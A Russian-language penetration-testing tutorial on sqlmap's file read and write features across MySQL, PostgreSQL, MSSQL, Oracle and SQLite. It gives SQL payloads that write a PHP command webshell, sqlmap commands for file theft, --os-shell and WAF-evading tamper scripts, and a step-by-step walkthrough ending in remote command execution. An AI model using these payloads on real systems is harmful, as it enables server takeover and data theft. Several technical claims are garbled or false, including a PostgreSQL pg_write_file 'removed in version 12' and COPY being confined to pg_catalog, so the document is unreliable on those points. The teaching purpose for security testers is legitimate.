# Чтение и запись файлов в БД через sqlmap: механизмы, ограничения и практическая реализация

## Контекст и базовые понятия: файловые операции как вектор эскалации привилегий

Файловые операции в контексте эксплуатации уязвимостей SQL-инъекций представляют собой критический вектор эскалации влияния атаки с уровня получения данных (data exfiltration) до уровня выполнения произвольного кода (code execution) или полного захвата сервера (database takeover). Инструмент `sqlmap`, являющийся стандартом де-факто для автоматизации обнаружения и эксплуатации SQL-инъекций, предоставляет набор специализированных опций для взаимодействия с файловой системой целевого сервера баз данных. Однако эти возможности не являются универсальными: они строго зависят от типа СУБД, конфигурации безопасности (привилегий пользователя БД, настроек файловой системы ОС) и архитектуры приложения.

Понимание механизмов чтения и записи файлов требует разграничения двух фундаментально разных процессов:
1.  **Чтение файлов (File Read):** Извлечение содержимого произвольного файла с сервера БД и передача его через канал SQL-инъекции (обычно через ошибку или UNION-запрос). Это позволяет атакующему читать конфигурационные файлы, исходный код приложения, ключи шифрования или дампы паролей.
2.  **Запись файлов (File Write):** Запись произвольного содержимого в файл на сервере БД. Это часто используется для размещения веб-шеллов (webshells) или исполняемых файлов для последующего выполнения команд.

Ключевое заблуждение начинающих специалистов заключается в предположении, что `sqlmap` может записывать файлы в любую СУБД. На практике возможность записи файлов ограничена только теми СУБД, которые предоставляют встроенные функции для работы с бинарными данными или файловой системой на уровне движка базы данных. Для других СУБД запись файлов невозможна напрямую через SQL-инъекцию, и атакующий вынужден использовать обходные пути (например, выполнение команд через стек запросов или out-of-band каналы).

Ниже приведена сравнительная таблица, фиксирующая разграничение возможностей файловых операций в зависимости от типа СУБД, что является критически важным для планирования этапа эксплуатации.

| СУБД | Поддержка чтения файлов (`--file-read`) | Поддержка записи файлов (`--file-write`) | Механизм реализации | Ключевые ограничения |
| :--- | :--- | :--- | :--- | :--- |
| **MySQL** | Да | Да | `LOAD_FILE()`, `INTO OUTFILE` / `INTO DUMPFILE` | Требует привилегии `FILE`. Путь к файлу должен быть абсолютным. Размер файла ограничен `max_allowed_packet`. |
| **PostgreSQL** | Да | Да | `pg_read_file()`, `COPY ... FROM PROGRAM` / `COPY ... TO` | Требует роли `SUPERUSER` или привилегии `pg_read_all_files` (в новых версиях). Ограничения на пути (часто только в `pg_catalog` или `pg_temp`). |
| **Microsoft SQL Server** | Да | Да | `xp_cmdshell` (косвенно), `OPENROWSET(BULK...)`, `sp_OACreate` | Требует привилегии `sysadmin` или включения опции `xp_cmdshell`. Запись часто ограничена путями, доступными для записи сервисному аккаунту. |
| **Oracle** | Да (частично) | Нет (прямая) | `UTL_FILE` (для чтения/записи через PL/SQL) | Требует привилегии `EXECUTE` на пакет `UTL_FILE`. Требуется предварительное создание `DIRECTORY` объекта в БД. Прямая запись произвольного файла невозможна без настройки директории. |
| **SQLite** | Да | Нет | Чтение через `LOAD_EXTENSION` (если включено) или косвенно через дампы | SQLite — файловая СУБД. Файл базы данных сам является файлом. Прямое чтение других файлов ОС через SQL невозможно без расширения. |
| **PostgreSQL (Newer)** | Да | Да | `pg_read_file()`, `pg_write_file()` (в некоторых форках/версиях) | В стандартном PostgreSQL 12+ функция `pg_write_file` удалена из-за уязвимости. Требуется использование `COPY` с осторожностью. |

*Таблица 1. Сравнительный анализ возможностей файловых операций в различных СУБД.*

Важно различать **прямое чтение/запись** (когда данные передаются непосредственно в ответе на SQL-запрос) и **косвенное взаимодействие** (через выполнение системных команд). `sqlmap` абстрагирует эти различия, предоставляя единый интерфейс (`--file-read`, `--file-write`), но под капотом генерирует разные SQL- payloads в зависимости от целевой СУБД.

Для студентов необходимо усвоить, что файловые операции являются «тяжелой артиллерией» в арсенале тестировщика на проникновение. Они требуют высокого уровня доверия (привилегий) в СУБД. Если инъекция работает от имени пользователя с ограниченными правами (например, `SELECT` только к одной таблице), файловые операции будут невозможны. Поэтому этап определения привилегий (`--privileges`) предшествует попыткам работы с файлами.

## Внутреннее устройство: механизмы эксплуатации и ограничения

Механизмы чтения и записи файлов через SQL-инъекции глубоко интегрированы в архитектуру конкретных СУБД. `sqlmap` реализует эти механизмы через модульную систему плагинов (backends), где каждый бэкенд содержит набор функций (`payloads`) для генерации специфичных запросов.

### 1. Механизм чтения файлов (File Read)

Чтение файлов реализуется двумя основными способами:
1.  **Через ошибку (Error-based):** Извлечение содержимого файла через сообщение об ошибке. Это работает только для небольших файлов (обычно до 1024–2048 байт, в зависимости от буфера ошибки СУБД). `sqlmap` использует этот метод для быстрого чтения конфигурационных файлов (например, `/etc/passwd` или `wp-config.php`).
2.  **Через UNION-запрос (UNION-based):** Извлечение файла по частям (chunking). Файл разбивается на блоки, каждый блок кодируется (часто в hex или base64) и вставляется в UNION-запрос. Это позволяет читать файлы любого размера, но требует, чтобы целевая таблица имела достаточное количество колонок для размещения данных.

Для **MySQL** `sqlmap` использует функцию `LOAD_FILE()`.
```sql
-- Пример внутреннего запроса, генерируемого sqlmap для чтения файла
SELECT LOAD_FILE('/etc/passwd')
```
Ограничение: `LOAD_FILE` требует, чтобы файл принадлежал пользователю `mysql` или `root`, и файл не может находиться в директории `tmpdir`. Также файл не может быть больше `max_allowed_packet`.

Для **PostgreSQL** используется функция `pg_read_file()`.
```sql
-- Пример внутреннего запроса для PostgreSQL
SELECT pg_read_file('/etc/passwd', 0, 1024)
```
Ограничение: В PostgreSQL 12+ функция `pg_read_file` требует, чтобы файл находился в каталоге, доступном для чтения суперпользователю, или требовала роли `pg_read_all_files`. В более старых версиях требовалась роль `SUPERUSER`.

Для **Microsoft SQL Server** чтение часто осуществляется через `OPENROWSET(BULK...)`.
```sql
-- Пример внутреннего запроса для MSSQL
SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS x
```
Ограничение: Требуется включение опции `Ad Hoc Distributed Queries` и привилегии `sysadmin` или `administer bulk operations`.

### 2. Механизм записи файлов (File Write)

Запись файлов более сложна из-за ограничений безопасности СУБД.

Для **MySQL** используется оператор `INTO OUTFILE` или `INTO DUMPFILE`.
```sql
-- Пример внутреннего запроса для записи файла
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'
```
Ограничение:
1.  Требуется привилегия `FILE`.
2.  Файл создается пользователем `mysql` (или тем, от которого запущен сервис).
3.  Директория назначения должна существовать и быть доступной для записи.
4.  Запрещено перезаписывать существующие файлы (в некоторых версиях/конфигурациях).
5.  Запрещено писать в системные директории (например, `/etc/`).

Для **PostgreSQL** используется оператор `COPY`.
```sql
-- Пример внутреннего запроса для записи файла в PostgreSQL
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php'
```
Ограничение:
1.  Требуется роль `SUPERUSER` (в старых версиях) или привилегия `pg_write_server_files` (в новых версиях, PostgreSQL 14+).
2.  В PostgreSQL 12+ функция `pg_write_file` была удалена, поэтому `COPY` стал основным методом, но он также имеет строгие ограничения на пути (часто только в `pg_catalog` или `pg_temp` для безопасности, но `COPY TO` с абсолютным путем требует прав суперпользователя).

Для **Microsoft SQL Server** запись файлов часто осуществляется через `xp_cmdshell` (вызов `echo` или `copy`) или через `sp_OACreate` (OLE Automation).
```sql
-- Пример внутреннего запроса для записи файла в MSSQL через xp_cmdshell
EXEC xp_cmdshell 'echo ^<^?php system($_GET["cmd"]); ?^> > C:\inetpub\wwwroot\shell.php'
```
Ограничение: `xp_cmdshell` по умолчанию отключен. Требуется включение через `sp_configure` и привилегии `sysadmin`.

### 3. Ограничения и векторы защиты

Современные СУБД и операционные системы имеют множество механизмов защиты от несанкционированного доступа к файловой системе:
*   **Привилегии:** Самым важным ограничением является уровень привилегий пользователя БД. Если инъекция работает от имени пользователя с правами `SELECT` только к одной таблице, файловые операции невозможны.
*   **Конфигурация СУБД:** Опции вроде `secure_file_priv` в MySQL, `superuser_reserved_connections` в PostgreSQL, `xp_cmdshell` в MSSQL.
*   **Ограничения ОС:** Права доступа к файлам (chmod/chown), SELinux/AppArmor, UAC (User Account Control) в Windows.
*   **WAF (Web Application Firewall):** Многие WAF блокируют запросы, содержащие `LOAD_FILE`, `INTO OUTFILE`, `COPY`, `xp_cmdshell`.

`sqlmap` пытается обойти некоторые из этих ограничений, используя техники обфускации (замена пробелов на `%09`, `%20`, использование комментариев `/**/`, Unicode-кодирование). Однако если привилегий недостаточно, никакая обфускация не поможет.

## Применение и работа с предметом: практические команды и параметры

Работа с файловыми операциями в `sqlmap` осуществляется через ключи командной строки `--file-read` и `--file-write`. Эти ключи требуют предварительного обнаружения уязвимости и определения целевой СУБД.

### 1. Чтение файлов (`--file-read`)

Синтаксис:
```bash
sqlmap -u "http://target.com/page.php?id=1" --file-read="/path/to/file/on/server"
```

`sqlmap` автоматически определяет метод эксплуатации (UNION, Error, Blind) и генерирует соответствующий payload. Для больших файлов `sqlmap` использует технику chunking, разбивая файл на части и собирая их в памяти.

Пример команды для чтения конфигурационного файла WordPress:
```bash
sqlmap -u "http://target.com/wp-admin/admin-ajax.php?action=login" --file-read="/var/www/html/wp-config.php" -p action
```
Здесь `-p action` указывает параметр, в котором происходит инъекция. Если параметр не указан, `sqlmap` будет перебирать все параметры.

### 2. Запись файлов (`--file-write` и `--file-dest`)

Синтаксис:
```bash
sqlmap -u "http://target.com/page.php?id=1" --file-write="/path/to/local/file" --file-dest="/path/to/remote/file"
```

`--file-write` указывает локальный файл, который нужно загрузить.
`--file-dest` указывает путь назначения на сервере.

Пример команды для записи веб-шелла в MySQL:
```bash
sqlmap -u "http://target.com/page.php?id=1" --file-write="/tmp/shell.php" --file-dest="/var/www/html/shell.php"
```

### 3. Комбинированные операции и эскалация

Часто файловые операции используются как этап перед выполнением команд. Например, запись веб-шелла позволяет получить интерактивный доступ к серверу, после чего можно использовать `--os-shell` для выполнения команд.

```bash
sqlmap -u "http://target.com/page.php?id=1" --os-shell
```
Эта команда автоматически пытается записать веб-шелл (или использовать существующий, если он найден) и предоставляет интерактивную оболочку.

### 4. Обход ограничений и отладка

При работе с файловыми операциями часто возникают ошибки. Для отладки используется ключ `--technique` для принудительного выбора метода (например, `--technique=U` для UNION) и `--prefix`/`--suffix` для модификации payload.

Пример команды с указанием техники и префикса:
```bash
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd" --technique=U --prefix="'" --suffix="'"
```

### 5. Типичные ошибки и подводные камни

1.  **Недостаток привилегий:** Самая частая ошибка — попытка чтения/записи файлов без проверки привилегий. Всегда используйте `--privileges` перед файловыми операциями.
2.  **Неверные пути:** Путь к файлу на сервере должен быть абсолютным и соответствовать файловой системе сервера. `sqlmap` не угадывает пути.
3.  **Ограничения размера:** Для UNION-запросов размер файла не должен превышать размер буфера ответа. Для MySQL это `max_allowed_packet`.
4.  **WAF-блокировки:** Если запрос блокируется WAF, используйте `--tamper` скрипты для обфускации.

```bash
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd" --tamper=space2comment,randomcase
```

## Сквозной практический пример: Эксплуатация уязвимости SQL-инъекции для чтения конфигурационного файла и записи веб-шелла

**Исходные условия:**
*   **Цель:** Веб-приложение на PHP с уязвимостью SQL-инъекции в параметре `id` (GET-запрос).
*   **СУБД:** MySQL 5.7.
*   **Роль:** Тестировщик на проникновение, имеющий доступ к `sqlmap` и целевой системе.
*   **Цель:** Прочитать файл `/var/www/html/config/database.yml` (конфигурация базы данных) и записать веб-шелл в `/var/www/html/uploads/shell.php`.

### Шаг 1: Обнаружение уязвимости и определение СУБД

Перед файловыми операциями необходимо подтвердить наличие уязвимости и определить тип СУБД.

```bash
sqlmap -u "http://target.com/product.php?id=1" --dbs --batch
```
*Действие:* Запуск сканирования для определения баз данных.
*Ожидаемый вывод:* `sqlmap` определяет, что уязвимость является UNION-based, и СУБД — MySQL.

### Шаг 2: Проверка привилегий

Проверка прав пользователя БД, от которого выполняется запрос.

```bash
sqlmap -u "http://target.com/product.php?id=1" --current-user --batch
```
*Действие:* Получение текущего пользователя.
*Ожидаемый вывод:* `current user: 'www-data'@'localhost'` (или аналогичный пользователь с привилегией `FILE`).

### Шаг 3: Чтение файла (`--file-read`)

Чтение конфигурационного файла базы данных.

```bash
sqlmap -u "http://target.com/product.php?id=1" --file-read="/var/www/html/config/database.yml" --batch
```
*Действие:* Запрос на чтение файла.
*Ожидаемый вывод:* Содержимое файла выводится в консоль. Если файл не найден или нет прав, будет ошибка `File '/var/www/html/config/database.yml' cannot be found`.

### Шаг 4: Запись файла (`--file-write` и `--file-dest`)

Запись веб-шелла в директорию, доступную для веб-сервера.

```bash
sqlmap -u "http://target.com/product.php?id=1" --file-write="/tmp/shell.php" --file-dest="/var/www/html/uploads/shell.php" --batch
```
*Действие:* Загрузка локального файла `/tmp/shell.php` и запись его на сервер.
*Ожидаемый вывод:* `file '/var/www/html/uploads/shell.php' written successfully`.

### Шаг 5: Верификация и доступ

Проверка доступности веб-шелла через браузер или curl.

```bash
curl "http://target.com/uploads/shell.php?cmd=id"
```
*Действие:* Выполнение команды `id` через веб-шелл.
*Ожидаемый вывод:* `uid=33(www-data) gid=33(www-data) groups=33(www-data)`.

**Ожидаемый вывод примера:**
Пример демонстрирует полный цикл эксплуатации: от обнаружения уязвимости до получения интерактивного доступа к серверу через файловые операции. Ключевым фактором успеха является наличие привилегии `FILE` в MySQL и возможность записи в целевую директорию.

## Аналитический вывод

Файловые операции через SQL-инъекции представляют собой мощный вектор атаки, позволяющий эскалировать влияние с уровня данных до уровня выполнения кода. Однако их эффективность строго ограничена архитектурой СУБД и конфигурацией безопасности. MySQL и PostgreSQL предоставляют наиболее прямые механизмы для чтения и записи файлов, но требуют высоких привилегий. MSSQL требует включения дополнительных функций (`xp_cmdshell`). Oracle имеет ограниченные возможности прямой записи. Современные системы защиты (WAF, SELinux, AppArmor) и лучшие практики конфигурации (минимальные привилегии, отключение небезопасных функций) значительно снижают риск успешной эксплуатации. Тестировщикам на проникновение необходимо тщательно проверять привилегии и конфигурацию СУБД перед попытками файловых операций, а также использовать техники обфускации для обхода WAF. Понимание внутренних механизмов СУБД критически важно для выбора правильного метода эксплуатации и интерпретации результатов.
